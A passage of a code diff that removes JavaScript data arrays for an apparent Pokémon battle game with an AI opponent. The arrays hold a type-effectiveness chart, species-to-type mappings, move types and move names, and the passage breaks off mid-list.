@@ -1,285 +1,1073 @@
-var useAI=true;
-var miei;
-var suoi;
-var myhax = 0;
-var hishax = 0;
-var winrate;
-var typetable = ["0:2 2 2 2 2 1 2 0 1 2 2 2 2 2 2 2 2 2", "1:4 2 1 1 2 4 1 0 4 2 2 2 2 1 4 2 4 2", "2:2 4 2 2 2 1 4 2 1 2 2 4 1 2 2 2 2 2", "3:2 2 2 1 1 1 2 1 0 2 2 4 2 2 2 2 2 2", "4:2 2 0 4 2 4 1 2 4 4 2 1 4 2 2 2 2 2", "5:2 1 4 2 1 2 4 2 1 4 2 2 2 2 4 2 2 2", "6:2 1 1 1 2 2 2 1 1 1 2 4 2 4 2 2 4 2", "7:0 2 2 2 2 2 2 4 1 2 2 2 2 4 2 2 1 2", "8:2 2 2 2 2 4 2 2 1 1 1 2 1 2 4 2 2 2", "9:2 2 2 2 2 1 4 2 4 1 1 4 2 2 4 1 2 2", "10:2 2 2 2 4 4 2 2 2 4 1 1 2 2 2 1 2 2", "11:2 2 1 1 4 4 1 2 1 1 4 1 2 2 2 1 2 2", "12:2 2 4 2 0 2 2 2 2 2 4 1 1 2 2 1 2 2", " 13:2 4 2 4 2 2 2 2 1 2 2 2 2 1 2 2 0 2", "14:2 2 4 2 4 2 2 2 1 1 1 4 2 2 1 4 2 2", "15:2 2 2 2 2 2 2 2 1 2 2 2 2 2 2 4 2 2", "16:2 1 2 2 2 2 2 4 1 2 2 2 2 4 2 2 1 2", "17:2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2"];
-var poketypes1 = ["0:0 0", " 1:0 11", " 2:0 11", " 3:0 11", " 4:0 9", " 5:0 9", " 6:0 9", " 7:0 10", " 8:0 10", " 9:0 10", " 10:0 6", " 11:0 6", " 12:0 6", " 13:0 6", " 14:0 6", " 15:0 6", " 16:0 0", " 17:0 0", " 18:0 0", " 19:0 0", " 20:0 0", " 21:0 0", " 22:0 0", " 23:0 3", " 24:0 3", " 25:0 12", " 26:0 12", " 27:0 4", " 28:0 4", " 29:0 3", " 30:0 3", " 31:0 3", " 32:0 3", " 33:0 3", " 34:0 3", " 35:0 0", " 36:0 0", " 37:0 9", " 38:0 9", " 39:0 0", " 40:0 0", " 41:0 3", " 42:0 3", " 43:0 11", " 44:0 11", " 45:0 11", " 46:0 6", " 47:0 6", " 48:0 6", " 49:0 6", " 50:0 4", " 51:0 4", " 52:0 0", " 53:0 0", " 54:0 10", " 55:0 10", " 56:0 1", " 57:0 1", " 58:0 9", " 59:0 9", " 60:0 10", " 61:0 10", " 62:0 10", " 63:0 13", " 64:0 13", " 65:0 13", " 66:0 1", " 67:0 1", " 68:0 1", " 69:0 11", " 70:0 11", " 71:0 11", " 72:0 10", " 73:0 10", " 74:0 5", " 75:0 5", " 76:0 5", " 77:0 9", " 78:0 9", " 79:0 10", " 80:0 10", " 81:0 12", " 82:0 12", " 83:0 0", " 84:0 0", " 85:0 0", " 86:0 10", " 87:0 10", " 88:0 3", " 89:0 3", " 90:0 10", " 91:0 10", " 92:0 7", " 93:0 7", " 94:0 7", " 95:0 5", " 96:0 13", " 97:0 13", " 98:0 10", " 99:0 10", " 100:0 12", " 101:0 12", " 102:0 11", " 103:0 11", " 104:0 4", " 105:0 4", " 106:0 1", " 107:0 1", " 108:0 0", " 109:0 3", " 110:0 3", " 111:0 4", " 112:0 4", " 113:0 0", " 114:0 11", " 115:0 0", " 116:0 10", " 117:0 10", " 118:0 10", " 119:0 10", " 120:0 10", " 121:0 10", " 122:0 13", " 123:0 6", " 124:0 14", " 125:0 12", " 126:0 9", " 127:0 6", " 128:0 0", " 129:0 10", " 130:0 10", " 131:0 10", " 132:0 0", " 133:0 0", " 134:0 10", " 135:0 12", " 136:0 9", " 137:0 0", " 138:0 5", " 139:0 5", " 140:0 5", " 141:0 5", " 142:0 5", " 143:0 0", " 144:0 14", " 145:0 12", " 146:0 9", " 147:0 15", " 148:0 15", " 149:0 15", " 150:0 13", " 151:0 13", " 152:0 11", " 153:0 11", " 154:0 11", " 155:0 9", " 156:0 9", " 157:0 9", " 158:0 10", " 159:0 10", " 160:0 10", " 161:0 0", " 162:0 0", " 163:0 0", " 164:0 0", " 165:0 6", " 166:0 6", " 167:0 6", " 168:0 6", " 169:0 3", " 170:0 10", " 171:0 10", " 172:0 12", " 173:0 0", " 174:0 0", " 175:0 0", " 176:0 0", " 177:0 13", " 178:0 13", " 179:0 12", " 180:0 12", " 181:0 12", " 182:0 11", " 183:0 10", " 184:0 10", " 185:0 5", " 186:0 10", " 187:0 11", " 188:0 11", " 189:0 11", " 190:0 0", " 191:0 11", " 192:0 11", " 193:0 6", " 194:0 10", " 195:0 10", " 196:0 13", " 197:0 16", " 198:0 16", " 199:0 10", " 200:0 7", " 201:0 13", " 202:0 13", " 203:0 0", " 204:0 6", " 205:0 6", " 206:0 0", " 207:0 4", " 208:0 8", " 209:0 0", " 210:0 0", " 211:0 10", " 212:0 6", " 213:0 6", " 214:0 6", " 215:0 16", " 216:0 0", " 217:0 0", " 218:0 9", " 219:0 9", " 220:0 14", " 221:0 14", " 222:0 10", " 223:0 10", " 224:0 10", " 225:0 14", " 226:0 10", " 227:0 8", " 228:0 16", " 229:0 16", " 230:0 10", " 231:0 4", " 232:0 4", " 233:0 0", " 234:0 0", " 235:0 0", " 236:0 1", " 237:0 1", " 238:0 14", " 239:0 12", " 240:0 9", " 241:0 0", " 242:0 0", " 243:0 12", " 244:0 9", " 245:0 10", " 246:0 5", " 247:0 5", " 248:0 5", " 249:0 13", " 250:0 9", " 251:0 13", " 252:0 11", " 253:0 11", " 254:0 11", " 255:0 9", " 256:0 9", " 257:0 9", " 258:0 10", " 259:0 10", " 260:0 10", " 261:0 16", " 262:0 16", " 263:0 0", " 264:0 0", " 265:0 6", " 266:0 6", " 267:0 6", " 268:0 6", " 269:0 6", " 270:0 10", " 271:0 10", " 272:0 10", " 273:0 11", " 274:0 11", " 275:0 11", " 276:0 0", " 277:0 0", " 278:0 10", " 279:0 10", " 280:0 13", " 281:0 13", " 282:0 13", " 283:0 6", " 284:0 6", " 285:0 11", " 286:0 11", " 287:0 0", " 288:0 0", " 289:0 0", " 290:0 6", " 291:0 6", " 292:0 6", " 293:0 0", " 294:0 0", " 295:0 0", " 296:0 1", " 297:0 1", " 298:0 0", " 299:0 5", " 300:0 0", " 301:0 0", " 302:0 16", " 303:0 8", " 304:0 8", " 305:0 8", " 306:0 8", " 307:0 1", " 308:0 1", " 309:0 12", " 310:0 12", " 311:0 12", " 312:0 12", " 313:0 6", " 314:0 6", " 315:0 11", " 316:0 3", " 317:0 3", " 318:0 10", " 319:0 10", " 320:0 10", " 321:0 10", " 322:0 9", " 323:0 9", " 324:0 9", " 325:0 13", " 326:0 13", " 327:0 0", " 328:0 4", " 329:0 4", " 330:0 4", " 331:0 11", " 332:0 11", " 333:0 0", " 334:0 15", " 335:0 0", " 336:0 3", " 337:0 5", " 338:0 5", " 339:0 10", " 340:0 10", " 341:0 10", " 342:0 10", " 343:0 4", " 344:0 4", " 345:0 5", " 346:0 5", " 347:0 5", " 348:0 5", " 349:0 10", " 350:0 10", " 351:0 0", " 351:1 14", " 351:2 10", " 351:4 9", " 352:0 0", " 353:0 7", " 354:0 7", " 355:0 7", " 356:0 7", " 357:0 11", " 358:0 13", " 359:0 16", " 360:0 13", " 361:0 14", " 362:0 14", " 363:0 14", " 364:0 14", " 365:0 14", " 366:0 10", " 367:0 10", " 368:0 10", " 369:0 10", " 370:0 10", " 371:0 15", " 372:0 15", " 373:0 15", " 374:0 8", " 375:0 8", " 376:0 8", " 377:0 5", " 378:0 14", " 379:0 8", " 380:0 15", " 381:0 15", " 382:0 10", " 383:0 4", " 384:0 15", " 385:0 8", " 386:0 13", " 387:0 11", " 388:0 11", " 389:0 11", " 390:0 9", " 391:0 9", " 392:0 9", " 393:0 10", " 394:0 10", " 395:0 10", " 396:0 0", " 397:0 0", " 398:0 0", " 399:0 0", " 400:0 0", " 401:0 6", " 402:0 6", " 403:0 12", " 404:0 12", " 405:0 12", " 406:0 11", " 407:0 11", " 408:0 5", " 409:0 5", " 410:0 5", " 411:0 5", " 412:0 6", " 413:0 6", " 414:0 6", " 415:0 6", " 416:0 6", " 417:0 12", " 418:0 10", " 419:0 10", " 420:0 11", " 421:0 11", " 422:0 10", " 423:0 10", " 424:0 0", " 425:0 7", " 426:0 7", " 427:0 0", " 428:0 0", " 429:0 7", " 430:0 16", " 431:0 0", " 432:0 0", " 433:0 13", " 434:0 3", " 435:0 3", " 436:0 8", " 437:0 8", " 438:0 5", " 439:0 13", " 440:0 0", " 441:0 0", " 442:0 7", " 443:0 15", " 444:0 15", " 445:0 15", " 446:0 0", " 447:0 1", " 448:0 1", " 449:0 4", " 450:0 4", " 451:0 3", " 452:0 3", " 453:0 3", " 454:0 3", " 455:0 11", " 456:0 10", " 457:0 10", " 458:0 10", " 459:0 14", " 460:0 14", " 461:0 16", " 462:0 12", " 463:0 0", " 464:0 4", " 465:0 11", " 466:0 12", " 467:0 9", " 468:0 0", " 469:0 6", " 470:0 11", " 471:0 14", " 472:0 4", " 473:0 14", " 474:0 0", " 475:0 13", " 476:0 5", " 477:0 7", " 478:0 14", " 479:0 12", " 480:0 13", " 481:0 13", " 482:0 13", " 483:0 8", " 484:0 10", " 485:0 9", " 486:0 0", " 487:0 7", " 488:0 13", " 489:0 10", " 490:0 10", " 491:0 16", " 492:0 11", " 493:0 0", " 493:1 1", " 493:2 2", " 493:3 3", " 493:4 4", " 493:5 5", " 493:6 6", " 493:7 7", " 493:8 8", " 493:9 9", " 493:10 10", " 493:11 11", " 493:12 12", " 493:13 13", " 493:14 14", " 493:15 15", " 493:16 16", " 493:17 17", " 494:0 13", " 495:0 11", " 496:0 11", " 497:0 11", " 498:0 9", " 499:0 9", " 500:0 9", " 501:0 10", " 502:0 10", " 503:0 10", " 504:0 0", " 505:0 0", " 506:0 0", " 507:0 0", " 508:0 0", " 509:0 16", " 510:0 16", " 511:0 11", " 512:0 11", " 513:0 9", " 514:0 9", " 515:0 10", " 516:0 10", " 517:0 13", " 518:0 13", " 519:0 0", " 520:0 0", " 521:0 0", " 522:0 12", " 523:0 12", " 524:0 5", " 525:0 5", " 526:0 5", " 527:0 13", " 528:0 13", " 529:0 4", " 530:0 4", " 531:0 0", " 532:0 1", " 533:0 1", " 534:0 1", " 535:0 10", " 536:0 10", " 537:0 10", " 538:0 1", " 539:0 1", " 540:0 6", " 541:0 6", " 542:0 6", " 543:0 6", " 544:0 6", " 545:0 6", " 546:0 11", " 547:0 11", " 548:0 11", " 549:0 11", " 550:0 10", " 551:0 4", " 552:0 4", " 553:0 4", " 554:0 9", " 555:0 9", " 555:1 9", " 556:0 11", " 557:0 6", " 558:0 6", " 559:0 16", " 560:0 16", " 561:0 13", " 562:0 7", " 563:0 7", " 564:0 10", " 565:0 10", " 566:0 5", " 567:0 5", " 568:0 3", " 569:0 3", " 570:0 16", " 571:0 16", " 572:0 0", " 573:0 0", " 574:0 13", " 575:0 13", " 576:0 13", " 577:0 13", " 578:0 13", " 579:0 13", " 580:0 10", " 581:0 10", " 582:0 14", " 583:0 14", " 584:0 14", " 585:0 0", " 586:0 0", " 587:0 12", " 588:0 6", " 589:0 6", " 590:0 11", " 591:0 11", " 592:0 10", " 593:0 10", " 594:0 10", " 595:0 6", " 596:0 6", " 597:0 11", " 598:0 11", " 599:0 8", " 600:0 8", " 601:0 8", " 602:0 12", " 603:0 12", " 604:0 12", " 605:0 13", " 606:0 13", " 607:0 7", " 608:0 7", " 609:0 7", " 610:0 15", " 611:0 15", " 612:0 15", " 613:0 14", " 614:0 14", " 615:0 14", " 616:0 6", " 617:0 6", " 618:0 4", " 619:0 1", " 620:0 1", " 621:0 15", " 622:0 4", " 623:0 4", " 624:0 16", " 625:0 16", " 626:0 0", " 627:0 0", " 628:0 0", " 629:0 16", " 630:0 16", " 631:0 9", " 632:0 6", " 633:0 16", " 634:0 16", " 635:0 16", " 636:0 6", " 637:0 6", " 638:0 8", " 639:0 5", " 640:0 11", " 641:0 2", " 642:0 12", " 643:0 15", " 644:0 15", " 645:0 4", " 646:0 15", " 647:0 10", " 648:0 0", " 648:1 0", " 649:0 6"];
-var poketypes2 = ["0:0 17", "1:0 3", "2:0 3", "3:0 3", "4:0 17", "5:0 17", "6:0 2", "7:0 17", "8:0 17", "9:0 17", "10:0 17", "11:0 17", "12:0 2", "13:0 3", "14:0 3", "15:0 3", "16:0 2", "17:0 2", "18:0 2", "19:0 17", "20:0 17", "21:0 2", "22:0 2", "23:0 17", "24:0 17", "25:0 17", "26:0 17", "27:0 17", "28:0 17", "29:0 17", "30:0 17", "31:0 4", "32:0 17", "33:0 17", "34:0 4", "35:0 17", "36:0 17", "37:0 17", "38:0 17", "39:0 17", "40:0 17", "41:0 2", "42:0 2", "43:0 3", "44:0 3", "45:0 3", "46:0 11", "47:0 11", "48:0 3", "49:0 3", "50:0 17", "51:0 17", "52:0 17", "53:0 17", "54:0 17", "55:0 17", "56:0 17", "57:0 17", "58:0 17", "59:0 17", "60:0 17", "61:0 17", "62:0 1", "63:0 17", "64:0 17", "65:0 17", "66:0 17", "67:0 17", "68:0 17", "69:0 3", "70:0 3", "71:0 3", "72:0 3", "73:0 3", "74:0 4", "75:0 4", "76:0 4", "77:0 17", "78:0 17", "79:0 13", "80:0 13", "81:0 8", "82:0 8", "83:0 2", "84:0 2", "85:0 2", "86:0 17", "87:0 14", "88:0 17", "89:0 17", "90:0 17", "91:0 14", "92:0 3", "93:0 3", "94:0 3", "95:0 4", "96:0 17", "97:0 17", "98:0 17", "99:0 17", "100:0 17", "101:0 17", "102:0 13", "103:0 13", "104:0 17", "105:0 17", "106:0 17", "107:0 17", "108:0 17", "109:0 17", "110:0 17", "111:0 5", "112:0 5", "113:0 17", "114:0 17", "115:0 17", "116:0 17", "117:0 17", "118:0 17", "119:0 17", "120:0 17", "121:0 13", "122:0 17", "123:0 2", "124:0 13", "125:0 17", "126:0 17", "127:0 17", "128:0 17", "129:0 17", "130:0 2", "131:0 14", "132:0 17", "133:0 17", "134:0 17", "135:0 17", "136:0 17", "137:0 17", "138:0 10", "139:0 10", "140:0 10", "141:0 10", "142:0 2", "143:0 17", "144:0 2", "145:0 2", "146:0 2", "147:0 17", "148:0 17", "149:0 2", "150:0 17", "151:0 17", "152:0 17", "153:0 17", "154:0 17", "155:0 17", "156:0 17", "157:0 17", "158:0 17", "159:0 17", "160:0 17", "161:0 17", "162:0 17", "163:0 2", "164:0 2", "165:0 2", "166:0 2", "167:0 3", "168:0 3", "169:0 2", "170:0 12", "171:0 12", "172:0 17", "173:0 17", "174:0 17", "175:0 17", "176:0 2", "177:0 2", "178:0 2", "179:0 17", "180:0 17", "181:0 17", "182:0 17", "183:0 17", "184:0 17", "185:0 17", "186:0 17", "187:0 2", "188:0 2", "189:0 2", "190:0 17", "191:0 17", "192:0 17", "193:0 2", "194:0 4", "195:0 4", "196:0 17", "197:0 17", "198:0 2", "199:0 13", "200:0 17", "201:0 17", "202:0 17", "203:0 13", "204:0 17", "205:0 8", "206:0 17", "207:0 2", "208:0 4", "209:0 17", "210:0 17", "211:0 3", "212:0 8", "213:0 5", "214:0 1", "215:0 14", "216:0 17", "217:0 17", "218:0 17", "219:0 5", "220:0 4", "221:0 4", "222:0 5", "223:0 17", "224:0 17", "225:0 2", "226:0 2", "227:0 2", "228:0 9", "229:0 9", "230:0 15", "231:0 17", "232:0 17", "233:0 17", "234:0 17", "235:0 17", "236:0 17", "237:0 17", "238:0 13", "239:0 17", "240:0 17", "241:0 17", "242:0 17", "243:0 17", "244:0 17", "245:0 17", "246:0 4", "247:0 4", "248:0 16", "249:0 2", "250:0 2", "251:0 11", "252:0 17", "253:0 17", "254:0 17", "255:0 17", "256:0 1", "257:0 1", "258:0 17", "259:0 4", "260:0 4", "261:0 17", "262:0 17", "263:0 17", "264:0 17", "265:0 17", "266:0 17", "267:0 2", "268:0 17", "269:0 3", "270:0 11", "271:0 11", "272:0 11", "273:0 17", "274:0 16", "275:0 16", "276:0 2", "277:0 2", "278:0 2", "279:0 2", "280:0 17", "281:0 17", "282:0 17", "283:0 10", "284:0 2", "285:0 17", "286:0 1", "287:0 17", "288:0 17", "289:0 17", "290:0 4", "291:0 2", "292:0 7", "293:0 17", "294:0 17", "295:0 17", "296:0 17", "297:0 17", "298:0 17", "299:0 17", "300:0 17", "301:0 17", "302:0 7", "303:0 17", "304:0 5", "305:0 5", "306:0 5", "307:0 13", "308:0 13", "309:0 17", "310:0 17", "311:0 17", "312:0 17", "313:0 17", "314:0 17", "315:0 3", "316:0 17", "317:0 17", "318:0 16", "319:0 16", "320:0 17", "321:0 17", "322:0 4", "323:0 4", "324:0 17", "325:0 17", "326:0 17", "327:0 17", "328:0 17", "329:0 15", "330:0 15", "331:0 17", "332:0 16", "333:0 2", "334:0 2", "335:0 17", "336:0 17", "337:0 13", "338:0 13", "339:0 4", "340:0 4", "341:0 17", "342:0 16", "343:0 13", "344:0 13", "345:0 11", "346:0 11", "347:0 6", "348:0 6", "349:0 17", "350:0 17", "351:0 17", "352:0 17", "353:0 17", "354:0 17", "355:0 17", "356:0 17", "357:0 2", "358:0 17", "359:0 17", "360:0 17", "361:0 17", "362:0 17", "363:0 10", "364:0 10", "365:0 10", "366:0 17", "367:0 17", "368:0 17", "369:0 5", "370:0 17", "371:0 17", "372:0 17", "373:0 2", "374:0 13", "375:0 13", "376:0 13", "377:0 17", "378:0 17", "379:0 17", "380:0 13", "381:0 13", "382:0 17", "383:0 17", "384:0 2", "385:0 13", "386:0 17", "387:0 17", "388:0 17", "389:0 4", "390:0 17", "391:0 1", "392:0 1", "393:0 17", "394:0 17", "395:0 8", "396:0 2", "397:0 2", "398:0 2", "399:0 17", "400:0 10", "401:0 17", "402:0 17", "403:0 17", "404:0 17", "405:0 17", "406:0 3", "407:0 3", "408:0 17", "409:0 17", "410:0 8", "411:0 8", "412:0 17", "413:0 11", "413:1 4", "413:2 8", "414:0 2", "415:0 2", "416:0 2", "417:0 17", "418:0 17", "419:0 17", "420:0 17", "421:0 17", "422:0 17", "423:0 4", "424:0 17", "425:0 2", "426:0 2", "427:0 17", "428:0 17", "429:0 17", "430:0 2", "431:0 17", "432:0 17", "433:0 17", "434:0 16", "435:0 16", "436:0 13", "437:0 13", "438:0 17", "439:0 17", "440:0 17", "441:0 2", "442:0 16", "443:0 4", "444:0 4", "445:0 4", "446:0 17", "447:0 17", "448:0 8", "449:0 17", "450:0 17", "451:0 6", "452:0 16", "453:0 1", "454:0 1", "455:0 17", "456:0 17", "457:0 17", "458:0 2", "459:0 11", "460:0 11", "461:0 14", "462:0 8", "463:0 17", "464:0 5", "465:0 17", "466:0 17", "467:0 17", "468:0 2", "469:0 2", "470:0 17", "471:0 17", "472:0 2", "473:0 4", "474:0 17", "475:0 1", "476:0 8", "477:0 17", "478:0 7", "479:0 7", "479:1 11", "479:2 9", "479:3 14", "479:4 10", "479:5 2", "480:0 17", "481:0 17", "482:0 17", "483:0 15", "484:0 15", "485:0 8", "486:0 17", "487:0 15", "488:0 17", "489:0 17", "490:0 17", "491:0 17", "492:0 17", "492:1 2", "493:0 17", "493:1 17", "493:2 17", "493:3 17", "493:4 17", "493:5 17", "493:6 17", "493:7 17", "493:8 17", "493:9 17", "493:10 17", "493:11 17", "493:12 17", "493:13 17", "493:14 17", "493:15 17", "493:16 17", "493:17 17", "494:0 9", "495:0 17", "496:0 17", "497:0 17", "498:0 17", "499:0 1", "500:0 1", "501:0 17", "502:0 17", "503:0 17", "504:0 17", "505:0 17", "506:0 17", "507:0 17", "508:0 17", "509:0 17", "510:0 17", "511:0 17", "512:0 17", "513:0 17", "514:0 17", "515:0 17", "516:0 17", "517:0 17", "518:0 17", "519:0 2", "520:0 2", "521:0 2", "522:0 17", "523:0 17", "524:0 17", "525:0 17", "526:0 17", "527:0 2", "528:0 2", "529:0 17", "530:0 8", "531:0 17", "532:0 17", "533:0 17", "534:0 17", "535:0 17", "536:0 4", "537:0 4", "538:0 17", "539:0 17", "540:0 11", "541:0 11", "542:0 11", "543:0 3", "544:0 3", "545:0 3", "546:0 17", "547:0 17", "548:0 17", "549:0 17", "550:0 17", "551:0 16", "552:0 16", "553:0 16", "554:0 17", "555:0 17", "555:1 13", "556:0 17", "557:0 5", "558:0 5", "559:0 1", "560:0 1", "561:0 2", "562:0 17", "563:0 17", "564:0 5", "565:0 5", "566:0 2", "567:0 2", "568:0 17", "569:0 17", "570:0 17", "571:0 17", "572:0 17", "573:0 17", "574:0 17", "575:0 17", "576:0 17", "577:0 17", "578:0 17", "579:0 17", "580:0 2", "581:0 2", "582:0 17", "583:0 17", "584:0 17", "585:0 11", "586:0 11", "587:0 2", "588:0 17", "589:0 8", "590:0 3", "591:0 3", "592:0 7", "593:0 7", "594:0 17", "595:0 12", "596:0 12", "597:0 8", "598:0 8", "599:0 17", "600:0 17", "601:0 17", "602:0 17", "603:0 17", "604:0 17", "605:0 17", "606:0 17", "607:0 9", "608:0 9", "609:0 9", "610:0 17", "611:0 17", "612:0 17", "613:0 17", "614:0 17", "615:0 17", "616:0 17", "617:0 17", "618:0 12", "619:0 17", "620:0 17", "621:0 17", "622:0 7", "623:0 7", "624:0 8", "625:0 8", "626:0 17", "627:0 2", "628:0 2", "629:0 2", "630:0 2", "631:0 17", "632:0 8", "633:0 15", "634:0 15", "635:0 15", "636:0 9", "637:0 9", "638:0 1", "639:0 1", "640:0 1", "641:0 17", "642:0 2", "643:0 9", "644:0 12", "645:0 2", "646:0 14", "647:0 1", "648:0 13", "648:1 1", "649:0 8"];
-var movetypes = ["0 17", "2 1", "7 9", "8 14", "9 12", "16 2", "17 2", "19 2", "22 11", "24 1", "26 1", "27 1", "28 4", "40 3", "41 6", "42 6", "44 16", "51 3", "52 9", "53 9", "54 14", "55 10", "56 10", "57 10", "58 14", "59 14", "60 13", "61 10", "62 14", "64 2", "65 2", "66 1", "67 1", "68 1", "69 1", "71 11", "72 11", "73 11", "75 11", "76 11", "77 3", "78 11", "79 11", "80 11", "81 6", "82 15", "83 9", "84 12", "85 12", "86 12", "87 12", "88 5", "89 4", "90 4", "91 4", "92 3", "93 13", "94 13", "95 13", "96 13", "97 13", "100 13", "101 7", "109 7", "110 10", "112 13", "113 13", "114 14", "115 13", "119 2", "122 7", "123 3", "124 3", "125 4", "126 9", "127 10", "128 10", "133 13", "134 13", "136 1", "138 13", "139 3", "141 6", "143 2", "145 10", "147 11", "149 13", "151 3", "152 10", "155 4", "156 13", "157 5", "165 17", "167 1", "168 16", "169 6", "171 7", "172 9", "174 7", "177 2", "178 11", "179 1", "180 7", "181 14", "183 1", "185 16", "188 3", "189 4", "190 10", "191 4", "192 12", "194 7", "196 14", "197 1", "198 4", "200 15", "201 5", "202 11", "205 5", "209 12", "210 6", "211 8", "221 9", "222 4", "223 1", "224 6", "225 15", "228 16", "231 8", "232 8", "233 1", "235 11", "238 1", "239 15", "240 10", "241 9", "242 16", "243 13", "246 5", "247 7", "248 13", "249 1", "250 10", "251 16", "257 9", "258 14", "259 16", "260 16", "261 9", "262 16", "264 1", "268 12", "269 16", "271 13", "272 13", "275 11", "276 1", "277 13", "279 1", "280 1", "282 16", "284 9", "285 13", "286 13", "288 7", "289 16", "291 10", "292 1", "294 6", "295 13", "296 13", "297 2", "299 9", "300 4", "301 14", "302 11", "305 3", "307 9", "308 10", "309 8", "310 7", "312 11", "313 16", "314 2", "315 9", "317 5", "318 6", "319 8", "320 11", "322 13", "323 10", "324 6", "325 7", "326 13", "327 1", "328 4", "329 14", "330 10", "331 11", "332 2", "333 14", "334 8", "337 15", "338 11", "339 1", "340 2", "341 4", "342 3", "344 12", "345 11", "346 10", "347 13", "348 11", "349 15", "350 5", "351 12", "352 10", "353 8", "354 13", "355 2", "356 13", "357 13", "358 1", "359 1", "360 8", "361 13", "362 10", "365 2", "366 2", "368 8", "369 6", "370 1", "371 16", "372 16", "373 16", "374 16", "375 13", "377 13", "379 13", "380 3", "384 13", "385 13", "386 16", "388 11", "389 16", "390 3", "391 13", "392 10", "393 12", "394 9", "395 1", "396 1", "397 5", "398 3", "399 16", "400 16", "401 10", "402 11", "403 2", "404 6", "405 6", "406 15", "407 15", "408 5", "409 1", "410 1", "411 1", "412 11", "413 2", "414 4", "415 16", "417 16", "418 8", "419 14", "420 14", "421 7", "422 12", "423 14", "424 9", "425 7", "426 4", "427 13", "428 13", "429 8", "430 8", "432 2", "433 13", "434 15", "435 12", "436 9", "437 11", "438 11", "439 5", "440 3", "441 3", "442 8", "443 8", "444 5", "446 5", "447 11", "448 2", "450 6", "237 9", "451 12", "452 11", "453 10", "454 6", "455 6", "456 6", "457 5", "459 15", "460 15", "461 13", "463 9", "464 16", "465 11", "466 7", "467 7", "468 16", "469 5", "470 13", "471 13", "472 13", "473 13", "474 3", "475 8", "476 6", "477 13", "478 13", "479 5", "480 1", "481 9", "482 3", "483 6", "484 8", "485 13", "486 12", "487 10", "488 9", "489 3", "490 1", "491 3", "492 16", "499 3", "500 13", "501 1", "502 13", "503 10", "505 13", "506 7", "507 2", "508 8", "509 1", "510 9", "511 16", "512 2", "515 1", "517 9", "518 10", "519 9", "520 11", "521 12", "522 6", "523 4", "524 14", "525 15", "527 12", "528 12", "529 4", "530 15", "531 13", "532 11", "533 1", "534 10", "535 9", "536 11", "537 6", "538 11", "539 16", "540 13", "542 2", "544 8", "545 9", "548 1", "549 14", "550 12", "551 9", "552 9", "553 14", "554 14", "555 16", "556 14", "557 9", "558 9", "559 12"];
-var movenames = ["0 ", "1 Pound", "2 Karate Chop", "3 DoubleSlap", "4 Comet Punch", "5 Mega Punch", "6 Pay Day", "7 Fire Punch", "8 Ice Punch", "9 ThunderPunch", "10 Scratch", "11 ViceGrip", "12 Guillotine", "13 Razor Wind", "14 Swords Dance", "15 Cut", "16 Gust", "17 Wing Attack", "18 Whirlwind", "19 Fly", "20 Bind", "21 Slam", "22 Vine Whip", "23 Stomp", "24 Double Kick", "25 Mega Kick", "26 Jump Kick", "27 Rolling Kick", "28 Sand-Attack", "29 Headbutt", "30 Horn Attack", "31 Fury Attack", "32 Horn Drill", "33 Tackle", "34 Body Slam", "35 Wrap", "36 Take Down", "37 Thrash", "38 Double-Edge", "39 Tail Whip", "40 Poison Sting", "41 Twineedle", "42 Pin Missile", "43 Leer", "44 Bite", "45 Growl", "46 Roar", "47 Sing", "48 Supersonic", "49 SonicBoom", "50 Disable", "51 Acid", "52 Ember", "53 Flamethrower", "54 Mist", "55 Water Gun", "56 Hydro Pump", "57 Surf", "58 Ice Beam", "59 Blizzard", "60 Psybeam", "61 BubbleBeam", "62 Aurora Beam", "63 Hyper Beam", "64 Peck", "65 Drill Peck", "66 Submission", "67 Low Kick", "68 Counter", "69 Seismic Toss", "70 Strength", "71 Absorb", "72 Mega Drain", "73 Leech Seed", "74 Growth", "75 Razor Leaf", "76 SolarBeam", "77 PoisonPowder", "78 Stun Spore", "79 Sleep Powder", "80 Petal Dance", "81 String Shot", "82 Dragon Rage", "83 Fire Spin", "84 ThunderShock", "85 Thunderbolt", "86 Thunder Wave", "87 Thunder", "88 Rock Throw", "89 Earthquake", "90 Fissure", "91 Dig", "92 Toxic", "93 Confusion", "94 Psychic", "95 Hypnosis", "96 Meditate", "97 Agility", "98 Quick Attack", "99 Rage", "100 Teleport", "101 Night Shade", "102 Mimic", "103 Screech", "104 Double Team", "105 Recover", "106 Harden", "107 Minimize", "108 SmokeScreen", "109 Confuse Ray", "110 Withdraw", "111 Defense Curl", "112 Barrier", "113 Light Screen", "114 Haze", "115 Reflect", "116 Focus Energy", "117 Bide", "118 Metronome", "119 Mirror Move", "120 Selfdestruct", "121 Egg Bomb", "122 Lick", "123 Smog", "124 Sludge", "125 Bone Club", "126 Fire Blast", "127 Waterfall", "128 Clamp", "129 Swift", "130 Skull Bash", "131 Spike Cannon", "132 Constrict", "133 Amnesia", "134 Kinesis", "135 Softboiled", "136 Hi Jump Kick", "137 Glare", "138 Dream Eater", "139 Poison Gas", "140 Barrage", "141 Leech Life", "142 Lovely Kiss", "143 Sky Attack", "144 Transform", "145 Bubble", "146 Dizzy Punch", "147 Spore", "148 Flash", "149 Psywave", "150 Splash", "151 Acid Armor", "152 Crabhammer", "153 Explosion", "154 Fury Swipes", "155 Bonemerang", "156 Rest", "157 Rock Slide", "158 Hyper Fang", "159 Sharpen", "160 Conversion", "161 Tri Attack", "162 Super Fang", "163 Slash", "164 Substitute", "165 Struggle", "166 Sketch", "167 Triple Kick", "168 Thief", "169 Spider Web", "170 Mind Reader", "171 Nightmare", "172 Flame Wheel", "173 Snore", "174 Curse", "175 Flail", "176 Conversion 2", "177 Aeroblast", "178 Cotton Spore", "179 Reversal", "180 Spite", "181 Powder Snow", "182 Protect", "183 Mach Punch", "184 Scary Face", "185 Faint Attack", "186 Sweet Kiss", "187 Belly Drum", "188 Sludge Bomb", "189 Mud-Slap", "190 Octazooka", "191 Spikes", "192 Zap Cannon", "193 Foresight", "194 Destiny Bond", "195 Perish Song", "196 Icy Wind", "197 Detect", "198 Bone Rush", "199 Lock-On", "200 Outrage", "201 Sandstorm", "202 Giga Drain", "203 Endure", "204 Charm", "205 Rollout", "206 False Swipe", "207 Swagger", "208 Milk Drink", "209 Spark", "210 Fury Cutter", "211 Steel Wing", "212 Mean Look", "213 Attract", "214 Sleep Talk", "215 Heal Bell", "216 Return", "217 Present", "218 Frustration", "219 Safeguard", "220 Pain Split", "221 Sacred Fire", "222 Magnitude", "223 DynamicPunch", "224 Megahorn", "225 DragonBreath", "226 Baton Pass", "227 Encore", "228 Pursuit", "229 Rapid Spin", "230 Sweet Scent", "231 Iron Tail", "232 Metal 